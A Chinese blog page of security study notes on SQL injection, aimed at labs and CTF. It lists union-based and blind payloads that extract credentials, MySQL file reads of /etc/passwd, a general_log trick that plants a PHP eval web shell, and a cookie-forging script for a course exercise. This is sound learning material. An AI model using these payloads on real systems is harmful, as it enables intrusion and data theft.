<h3 id="sql注入">SQL注入</h3>
<p>看用户名结尾加上 <code>#</code>, 是注释的意思</p>
<p>万能公式</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">万能公式</span></span><br><span class="line">1 and 1=1</span><br><span class="line">1' and '1'='1</span><br><span class="line">1 or 1=1 </span><br><span class="line">1' or '1'='1</span><br></pre></td></tr></table></figure>
<h4 id="url的码">url的码</h4>
<p><code>#</code> 是 <code>%23</code></p>
<h3 id="注入分类">注入分类</h3>
<p>数字型</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span>?</span><br></pre></td></tr></table></figure>
<p>字符型</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">'?'</span></span><br></pre></td></tr></table></figure>
<p>搜索型</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">'%?%'</span></span><br></pre></td></tr></table></figure>
<p>用万能公式可以查看</p>
<p>比如 <code>1 and 1=1</code>, 用数字型会查 <code>1</code> ,
字符型会变成 <code>1 and 1=1</code></p>
<h4 id="判断注入点有效">判断注入点有效</h4>
<p>字符型输入 <code>1'and '1'='1</code> , <code>1'and '1'='2</code>
然后再试试 如果是可注入的话，这两个结果是有区别的</p>
<h3 id="联合查询">联合查询</h3>
<h4 id="判断有几列">判断有几列</h4>
<p>用 <code>order by</code>
，orderby是根据第几列排序，如果报错说明正好多了一列</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span>;</span><br></pre></td></tr></table></figure>
<h4 id="判断显示的字段顺序">判断显示的字段顺序</h4>
<p>输入下面可以查询成功，说明是1，2 列</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">' union select 1,2 #</span></span><br></pre></td></tr></table></figure>
<h4 id="获取当前数据库名字">获取当前数据库名字</h4>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">' union select 1,database() #</span></span><br></pre></td></tr></table></figure>
<h4 id="获取当前数据库表名">获取当前数据库表名</h4>
<p><code>group_concat</code> 可以把多行数据放到一行里，
<code>information_schema</code>
是信息数据库，保存mysql服务器维护的所有其他数据库的信息</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</span></span><br></pre></td></tr></table></figure>
<h4 id="获取字段名">获取字段名</h4>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">' union select 1,group_concat(column_name) from information_schema.columns where table_name='</span>users<span class="string">' #</span></span><br></pre></td></tr></table></figure>
<h4 id="查询数据">查询数据</h4>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</span></span><br></pre></td></tr></table></figure>
<h4 id="如果groupconcat不能用">如果groupconcat不能用</h4>
<p>可以用limit , 从x行开始输出y个，下面显示的是第4个</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> name <span class="keyword">from</span> students limit <span class="number">4</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h3 id="command-injection">Command Injection</h3>
<p>常用符号：</p>
<p>当xx执行成功的时候，不会执行yy</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx || yy</span><br></pre></td></tr></table></figure>
<p>pipe</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx | yy</span><br></pre></td></tr></table></figure>
<h2 id="文件操作">文件操作</h2>
<h3 id="mysql-变量">MYSQL 变量</h3>
<p>通过 <code>show variables;</code> 然后通过 like 可以匹配</p>
<h4 id="secure-file-priv">secure file priv</h4>
<p><code>secure_file_priv</code>
变量对文件读写有影响，它指定了哪些目录可以进行读写操作，默认是
<code>null</code> ， 当它没有具体值时，表示不对导入导出做出限制</p>
<h4 id="读取文件">读取文件</h4>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(<span class="string">'/flag'</span>)</span><br></pre></td></tr></table></figure>
<p>utf8</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">convert</span>(load_file("/etc/passwd") <span class="keyword">using</span> utf8); </span><br></pre></td></tr></table></figure>
<h4 id="写入文件">写入文件</h4>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">0x616262</span> <span class="keyword">into</span> outfile <span class="string">'/tmp/outfile.php'</span>;</span><br></pre></td></tr></table></figure>
<p>也可以</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">0x616262</span> <span class="keyword">into</span> dumpfile <span class="string">'/tmp/d.php'</span>;</span><br></pre></td></tr></table></figure>
<p>dumpfile 只能导出一行，没有特使字符的转换</p>
<p>outfile可以导出多行，有特殊字符的转换</p>
<h3 id="堆叠注入">堆叠注入</h3>
<p>可以执行多条语句</p>
<p>在<code>secure_file_priv</code> 是 null的情况下可以用</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log<span class="operator">=</span><span class="keyword">on</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">'C:/phpStudy/WWW/789.php'</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php eval($_POST['</span>a<span class="string">']) ?&gt;'</span>;</span><br></pre></td></tr></table></figure>
<p>只有支持多条语句的时候才能用</p>
<p>过滤了select可以用handler</p>
<blockquote>
<p>buuctf 随便注</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">handler users <span class="keyword">open</span> <span class="keyword">as</span> hd;</span><br><span class="line">handler hd read <span class="keyword">first</span>; # 读取第一条</span><br><span class="line">handler hd read next; # 读取下一条</span><br><span class="line">handler hd <span class="keyword">close</span>; # 关闭</span><br></pre></td></tr></table></figure>
<p>用rename</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename <span class="keyword">table</span> `words` <span class="keyword">to</span> `words2`;</span><br><span class="line">rename <span class="keyword">table</span> `<span class="number">1919</span>` <span class="keyword">to</span> `words`;</span><br><span class="line"><span class="keyword">alter table</span> `words` change `flag` `id` <span class="type">varchar</span>(<span class="number">100</span>) <span class="keyword">character set</span> utf8 <span class="keyword">collate</span> utf8_general_ci <span class="keyword">not null</span>;#</span><br></pre></td></tr></table></figure>
<p>用prepare</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">prepare</span> st <span class="keyword">from</span> concat(<span class="string">'s'</span>,<span class="string">'elct'</span>,<span class="string">' * from `1919`'</span>); <span class="keyword">execute</span> st;#</span><br></pre></td></tr></table></figure>
<h3 id="宽字节注入">宽字节注入</h3>
<p>可以在php中这样判断</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="string">"和"</span>); <span class="comment">// 3</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="string">"a"</span>); <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<h3 id="盲注">盲注</h3>
<p>可以这样查找</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">'1'</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> database()),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">'a'</span></span><br></pre></td></tr></table></figure>
<h2 id="靶场建立">靶场建立</h2>
<p>https://deelmind.com/</p>
<h4 id="htb">HTB</h4>
<p>https://www.hackthebox.com/</p>
<h3 id="pikachu">Pikachu</h3>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker.io</span><br><span class="line">sudo docker search pikachu</span><br><span class="line">sudo docker run -itd -p 80:80 --name=pikachu area39/pikachu</span><br></pre></td></tr></table></figure>
<h3 id="dvwa">DVWA</h3>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker.io</span><br><span class="line">sudo docker pull infoslack/dvwa</span><br><span class="line">sudo docker run -d -p 2333:80 infoslack/dvwa</span><br></pre></td></tr></table></figure>
<p>账号密码： <code>admin</code> , <code>password</code></p>
<p>一开始进去再setup里面可以点create database</p>
<p>然后进入后再DVWA Security里面把 Security level 设置成 low</p>
<h2 id="cookie">Cookie</h2>
<p>浏览器开发者工具，里面Application里面可以找到Cookie，双击可以修改</p>
<h4 id="python-获取修改cookie">python 获取，修改cookie</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> requests.Session() <span class="keyword">as</span> session:</span><br><span class="line">    <span class="comment"># Example how to modify a session cookie using requests.</span></span><br><span class="line">    <span class="comment"># You need to modifiy the following code so it fits the homework task</span></span><br><span class="line">    r = session.post(burp0_url, headers=burp0_headers,  data=burp0_data)</span><br><span class="line">    raw_cookie = session.cookies[COOKIE]</span><br><span class="line">    <span class="comment"># print(session.cookies)</span></span><br><span class="line">    plaintext = <span class="built_in">bytearray</span>(<span class="string">b'{"user": "testuser"}'</span>)</span><br><span class="line">    hacktext = <span class="string">b'{"user": "admin"}'</span></span><br><span class="line"></span><br><span class="line">    NONCE_LENGTH=<span class="number">12</span></span><br><span class="line">    data = base64.b64decode(raw_cookie)</span><br><span class="line">    ciphertext, nonce = data[:-NONCE_LENGTH], data[-NONCE_LENGTH:]</span><br><span class="line">    </span><br><span class="line">    ks = xor(plaintext, ciphertext)</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    hackcookie = base64.b64encode(<span class="built_in">bytearray</span>(xor(hacktext,ks) + data[-NONCE_LENGTH:])).decode()</span><br><span class="line">    session.cookies.<span class="built_in">set</span>(name = COOKIE, value=hackcookie, domain = <span class="string">"t9-79b090f00afe4a5b.itsec.sec.in.tum.de"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Cookie is now modified for this (and the following) requests</span></span><br><span class="line">    r = session.get(<span class="string">f'https://t9-79b090f00afe4a5b.itsec.sec.in.tum.de'</span>)</span><br><span class="line">    <span class="built_in">print</span>(extract_flag_from_string(r.text))</span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://fyind.de">Fyind</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://fyind.de/2020/09/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">http://fyind.de/2020/09/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></div><div class="post-share"><div class="social-share" data-image="/img/pic1.PNG" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2020/09/18/%E6%95%B0%E6%8D%AE%E5%BA%93/" title="数据库"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">数据库</div></div><div class="info-2"><div class="info-item-1">引入 如果不使用数据库系统，会有很多问题，如数据的损失，多用户同时访问，安全问题，高昂的开发成本等。 数据库的结构 下面是一个数据库的示意图。最底层的是物理层，数据和数据结构(B树) 就存在这里。然后上面一层逻辑层是比如说放表格这些的位置。然后上面是不同的人相对于数据库不同的视角，因为权限不一样所以可以访问的也不一样   image-20200919100827092  更为具体的是下面这张图   image-20200919104235467  数据建模 类似我们在程序设计的时候要建模，在设计数据库的时候也要对数据建模，对于数据的概念模型有：  Entity-Relationship-Modell (ER-Modell) Unified Modeling Language(UML)  逻辑层面的模型有  Relationales Modell 同过关系来建模  比如在大学的范围里，我们可以建立下面的数据模型   image-20200919104540233  下面是对应的数据表   image-20200919104603239  数据库设计 数据库设计的过程   image...</div></div></div></a><a class="pagination-related" href="/2020/09/16/Javaweb/" title="Javaweb"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Javaweb</div></div><div class="info-2"><div class="info-item-1">Javaweb 安装 IDEA, 可以先用 -Ss 搜索intellij 来确定后面的版本号 1sudo pacman -S intellij-idea-ultimate-edition-2020.2.1-1 IDEA 使用技巧  别打开老项目 settings 里面 system settings了里面别勾选 Reopen   image-20200906194355077  Ctrl + 鼠标左键可以查看源代码 Alt + Shift + v 新建局部变量  Tomcat 安装 1sudo pacman -S tomcat9 最好要去官网下载, 这样用户有执行权限，pacman 下载的运行要家sudo, 在idea里会报错 启动 可以在zshrc里面加入 12alias tomcat=&quot;sudo zsh /usr/share/tomcat9/bin/startup.sh&quot;alias ctomcat=&quot;sudo zsh /usr/share/tomcat9/bin/shutdown.sh&quot; 然后可以 sudo tomcat 和 sudo ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2020/11/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="信息安全"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-08</div><div class="info-item-2">信息安全</div></div><div class="info-2"><div class="info-item-1">BufferOverflow 去这个网站https://exploit-exercises.lains.space/download/ 可以下载镜像。然后再VMware安装上。 进入后使用 user 用户名登录，密码也是 user 进去之后字非常小，我们可以用ssh登录，不过我们首先要查看一下ip地址，使用命令 1ip addr 可以查看   image-20201112200703182  然后我们用ssh连接 1ssh user@192.168.230.132 登录上去后，可以输入 bash 更换shell 然后使用命令 1uname -a 可以查看系统信息 网站上面说练习在 /opt/protostar/bin 这个目录下面 第0个挑战 更改一个变量 123456789101112131415161718#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;int main(int argc, char **argv)&#123;  volatile int modified;  ...</div></div></div></a><a class="pagination-related" href="/2020/11/08/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8/" title="网络空间安全"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-08</div><div class="info-item-2">网络空间安全</div></div><div class="info-2"><div class="info-item-1">Netzsicherheit 作业 Hack 进入作业的服务器 1nc netsec.net.in.tum.de 20001 Exercise 1 首先安装一下 netcat 1sudo pacman -S netcat base64加密解密 123import base64data_enc = base64.b64encode(data)data_dec = base64.b64decode(data_enc) Networt Insecure Do not Trust a Network Connection 网络是不安全的 Capabilities of Attackers  Passive attacks (observation)  Eavesdropping of messages Traffic Analysis  active attacks (observation + manipulation)  All passive attacks Delay Replay Deletion Modificatioin Insertion   Attacker Model...</div></div></div></a><a class="pagination-related" href="/2020/02/11/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E7%BD%91%E7%AB%99%E7%9A%84%E6%90%AD%E5%BB%BA/" title="虚拟机安装以及网站的搭建"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-02-11</div><div class="info-item-2">虚拟机安装以及网站的搭建</div></div><div class="info-2"><div class="info-item-1">虚拟机安装以及网站的搭建 一、 VMware WorkStation 安装和使用 Unity 模式 在该模式下，可以把虚拟机的窗口拖到真实机上。   image-20200203165854913  快照 在这里添加快照   image-20200203170140749  二、Windows Server 2003 下载安装完成后： 设置虚拟机交换机 设置虚拟机的交换机为VMnet1，下面的xp也一样设置   image-20200204050331629  设置ip地址 运行中输入ncpa.cpl可以打开网络设置/网卡 右键本地连接属性-&gt; tcp/ip协议 ，右键属性 在这里可以更改ip地址，下面的xp也一样设置，注意地址不要改一样的   image-20200204050717616  三、Windows Xp sp3 下载镜像后安装 序列号：MRX3F-47B9T-2487J-KWKMF-RPWBY Windows也和上面一样设置，然后关闭防火墙，它们就可以ping通过了 关闭防火墙 控制面板—&gt;安全中心—&gt;关闭防火墙   image-20200204...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/pic1.PNG" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Fyind</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">85</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">83</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">26</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Fyind"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Fyind" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:tarjan0025@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://jq.qq.com/?_wv=1027&amp;k=d0kMY0nN" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">欢迎来逛逛我的博客</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8"><span class="toc-number">1.</span> <span class="toc-text">网络安全</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#vmware-workstation"><span class="toc-number">1.1.</span> <span class="toc-text">Vmware Workstation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A1%A5%E6%8E%A5%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">桥接网络配置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.2.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#kali-linux"><span class="toc-number">1.2.1.</span> <span class="toc-text">Kali Linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows-server-2003"><span class="toc-number">1.2.2.</span> <span class="toc-text">Windows Server 2003</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#metasploitable2"><span class="toc-number">1.2.3.</span> <span class="toc-text">Metasploitable2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">1.2.4.</span> <span class="toc-text">Linux 常用命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5"><span class="toc-number">1.3.</span> <span class="toc-text">第二阶段</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85-nessus"><span class="toc-number">1.3.1.</span> <span class="toc-text">安装 Nessus</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AEwin2003%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2"><span class="toc-number">1.3.2.</span> <span class="toc-text">配置win2003远程桌面</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.4.</span> <span class="toc-text">主机探测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E5%B1%82%E5%8F%91%E7%8E%B0"><span class="toc-number">1.4.1.</span> <span class="toc-text">二层发现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#arping"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">arping</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#netdiscover"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">netdiscover</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E5%B1%82%E5%8F%91%E7%8E%B0"><span class="toc-number">1.4.2.</span> <span class="toc-text">三层发现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ping"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">ping</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fping"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">fping</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#hping3"><span class="toc-number">1.4.2.3.</span> <span class="toc-text">hping3</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E5%B1%82%E5%8F%91%E7%8E%B0"><span class="toc-number">1.4.3.</span> <span class="toc-text">四层发现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#nmap"><span class="toc-number">1.4.3.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#hping3-1"><span class="toc-number">1.4.3.2.</span> <span class="toc-text">hping3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nwatch"><span class="toc-number">1.4.3.3.</span> <span class="toc-text">nWatch</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.5.</span> <span class="toc-text">端口扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#nmap-1"><span class="toc-number">1.5.0.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dmitry"><span class="toc-number">1.5.0.2.</span> <span class="toc-text">dmitry</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#netcat"><span class="toc-number">1.5.0.3.</span> <span class="toc-text">netcat</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E5%88%86%E7%B1%BB"><span class="toc-number">1.5.1.</span> <span class="toc-text">端口分类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%A8%E7%9F%A5%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">周知端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">动态端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.5.1.3.</span> <span class="toc-text">注册端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nmap%E8%8E%B7%E5%8F%96banner"><span class="toc-number">1.5.1.4.</span> <span class="toc-text">nmap获取Banner</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dimitry%E8%8E%B7%E5%8F%96banner"><span class="toc-number">1.5.1.5.</span> <span class="toc-text">dimitry获取banner</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96"><span class="toc-number">1.5.2.</span> <span class="toc-text">端口，操作系统信息获取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E7%A8%8B%E5%BA%8F%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">端口程序信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">操作系统信息</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="toc-number">1.6.</span> <span class="toc-text">漏洞扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="toc-number">1.6.1.</span> <span class="toc-text">系统漏洞扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E5%8E%9F%E7%90%86"><span class="toc-number">1.6.1.1.</span> <span class="toc-text">扫描原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nmap%E6%89%AB%E6%8F%8F%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.6.1.2.</span> <span class="toc-text">nmap扫描漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nessus"><span class="toc-number">1.6.1.3.</span> <span class="toc-text">nessus</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.6.1.4.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" 